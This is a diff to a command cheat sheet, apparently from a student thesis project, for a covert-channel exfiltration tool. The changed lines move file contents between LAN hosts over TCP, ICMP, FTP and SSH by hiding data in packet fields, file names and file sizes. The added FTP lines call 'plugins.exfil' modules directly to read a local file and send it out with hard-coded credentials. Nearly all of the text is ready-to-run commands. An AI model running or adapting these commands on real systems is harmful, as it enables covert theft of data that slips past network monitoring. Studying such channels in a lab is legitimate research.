@@ -11,8 +11,8 @@ MIN  SEND   : python tfg_cli.py --plugins-dir plugins send --transfer-id TX_HTTP
 TCP (metodo 1 - SYN-ACK)
 FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_TCP1 --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9001 --auth-token SECRET123 --ritmo-base-ms 10 --ritmo-dispersion-ms 5 --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_tcp1.bin
 FULL SEND   : py -3 tfg_cli.py send --transfer-id TX_TCP1 --canal TCP --metodo 1 --host 192.168.1.50 --puerto 9001 --auth-token SECRET123 --ritmo-base-ms 10 --ritmo-dispersion-ms 5 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt --fragment-size 1024 --cifrado NINGUNO --plugins-dir plugins
-MIN  RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_TCP1 --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9001 --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_tcp1.bin
-MIN  SEND   : py -3 tfg_cli.py send --transfer-id TX_TCP1 --canal TCP --metodo 1 --host 192.168.1.50 --puerto 9001 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt --cifrado NINGUNO --plugins-dir plugins
+MIN  RECEIVE: python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP3 --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9000 --cifrado NINGUNO --out-file salida_tcp1.txt
+MIN  SEND   : python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP3 --canal TCP --metodo 3 --host 192.168.1.34 --puerto 9000 --recurso-tipo ARCHIVO --recurso-ubicacion C:\TFG-REPO\setup.txt --cifrado NINGUNO
 
 ICMP (metodo 1 - Identifier)
 FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_ICMP1 --canal ICMP --metodo 1 --host 192.168.1.100 --auth-token SECRET123 --ritmo-base-ms 10 --ritmo-dispersion-ms 5 --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_icmp1.bin
@@ -53,10 +53,10 @@ FULL SEND   : py -3 tfg_cli.py send --transfer-id TX_ICMP2 --canal ICMP --metodo
 MIN  SEND   : py -3 tfg_cli.py send --transfer-id TX_ICMP2 --canal ICMP --metodo 2 --host 192.168.1.100 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt --cifrado NINGUNO --plugins-dir plugins
 
 FTP (metodo 2 - nombres)
-FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_FTP2 --canal FTP --metodo 2 --host 192.168.1.10 --puerto 21 --user user --password pass --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ftp2.bin
-MIN  RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_FTP2 --canal FTP --metodo 2 --host 192.168.1.10 --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ftp2.bin
-FULL SEND   : py -3 tfg_cli.py send --transfer-id TX_FTP2 --canal FTP --metodo 2 --host 192.168.1.10 --puerto 21 --user user --password pass --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --fragment-size 1024 --cifrado NINGUNO --plugins-dir plugins
-MIN  SEND   : py -3 tfg_cli.py send --transfer-id TX_FTP2 --canal FTP --metodo 2 --host 192.168.1.10 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --cifrado NINGUNO --plugins-dir plugins
+FULL RECEIVE: py -3 -c "from plugins.exfil.ftp_server_names import FtpServerNames as P; import pathlib; p=P(); cfg={'host':'192.168.1.34','port':21,'user':'ftproot','password':'ftproot','root':'.','exfil_id':'RXFTP2'}; stream=p.run(cfg); pathlib.Path(r'C:\salida_ftp2.bin').write_bytes(b''.join(stream))"
+MIN  RECEIVE: py -3 -c "from plugins.exfil.ftp_server_names import FtpServerNames as P; import pathlib; p=P(); cfg={'host':'192.168.1.34','user':'ftproot','password':'ftproot','exfil_id':'RXFTP2'}; stream=p.run(cfg); pathlib.Path(r'C:\salida_ftp2.bin').write_bytes(b''.join(stream))"
+FULL SEND   : py -3 -c "from plugins.exfil.ftp_client_names import FtpClientNames as P; import pathlib; data=pathlib.Path(r'C:\fichero.bin').read_bytes(); p=P(); cfg={'host':'192.168.1.34','port':21,'user':'ftproot','password':'ftproot','root':'.','exfil_id':'RXFTP2'}; p.run(cfg,[data])"
+MIN  SEND   : py -3 -c "from plugins.exfil.ftp_client_names import FtpClientNames as P; import pathlib; data=pathlib.Path(r'C:\fichero.bin').read_bytes(); p=P(); cfg={'host':'192.168.1.34','user':'ftproot','password':'ftproot','exfil_id':'RXFTP2'}; p.run(cfg,[data])"
 
 SSH (metodo 2 - nombres)
 FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_SSH2 --canal SSH --metodo 2 --host 192.168.1.20 --puerto 22 --user alice --password secret --remote-dir /tmp --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ssh2.bin
@@ -78,11 +78,11 @@ MIN  RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_ICMP3 --canal ICMP --met
 FULL SEND   : py -3 tfg_cli.py send --transfer-id TX_ICMP3 --canal ICMP --metodo 3 --host 192.168.1.100 --auth-token SECRET123 --ritmo-base-ms 10 --ritmo-dispersion-ms 5 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt --fragment-size 1024 --cifrado NINGUNO --plugins-dir plugins
 MIN  SEND   : py -3 tfg_cli.py send --transfer-id TX_ICMP3 --canal ICMP --metodo 3 --host 192.168.1.100 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt --cifrado NINGUNO --plugins-dir plugins
 
-FTP (metodo 3 - tamaños)
-FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_FTP3 --canal FTP --metodo 3 --host 192.168.1.10 --puerto 21 --user user --password pass --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ftp3.bin
-MIN  RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_FTP3 --canal FTP --metodo 3 --host 192.168.1.10 --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ftp3.bin
-FULL SEND   : py -3 tfg_cli.py send --transfer-id TX_FTP3 --canal FTP --metodo 3 --host 192.168.1.10 --puerto 21 --user user --password pass --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --fragment-size 1024 --cifrado NINGUNO --plugins-dir plugins
-MIN  SEND   : py -3 tfg_cli.py send --transfer-id TX_FTP3 --canal FTP --metodo 3 --host 192.168.1.10 --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --cifrado NINGUNO --plugins-dir plugins
+FTP (metodo 3 - tamaños) — direct plugin usage
+FULL RECEIVE: py -3 -c "from plugins.exfil.ftp_server_size import FtpServerSize as P; import pathlib; p=P(); cfg={'host':'192.168.1.34','port':21,'user':'ftproot','password':'ftproot','root':'.','exfil_id':'RXFTP3'}; stream=p.run(cfg); pathlib.Path(r'C:\salida_ftp3.bin').write_bytes(b''.join(stream))"
+MIN  RECEIVE: py -3 -c "from plugins.exfil.ftp_server_size import FtpServerSize as P; import pathlib; p=P(); cfg={'host':'192.168.1.34','user':'ftproot','password':'ftproot','exfil_id':'RXFTP3'}; stream=p.run(cfg); pathlib.Path(r'C:\salida_ftp3.bin').write_bytes(b''.join(stream))"
+FULL SEND   : py -3 -c "from plugins.exfil.ftp_client_size import FtpClientSize as P; import pathlib; data=pathlib.Path(r'C:\fichero.bin').read_bytes(); p=P(); cfg={'host':'192.168.1.34','port':21,'user':'ftproot','password':'ftproot','root':'.','exfil_id':'RXFTP3'}; p.run(cfg,[data])"
+MIN  SEND   : py -3 -c "from plugins.exfil.ftp_client_size import FtpClientSize as P; import pathlib; data=pathlib.Path(r'C:\fichero.bin').read_bytes(); p=P(); cfg={'host':'192.168.1.34','user':'ftproot','password':'ftproot','exfil_id':'RXFTP3'}; p.run(cfg,[data])"
 
 SSH (metodo 3 - tamaños)
 FULL RECEIVE: py -3 tfg_cli.py receive --transfer-id RX_SSH3 --canal SSH --metodo 3 --host 192.168.1.20 --puerto 22 --user alice --password secret --remote-dir /tmp --cifrado NINGUNO --plugins-dir plugins --out-file C:\salida_ssh3.bin
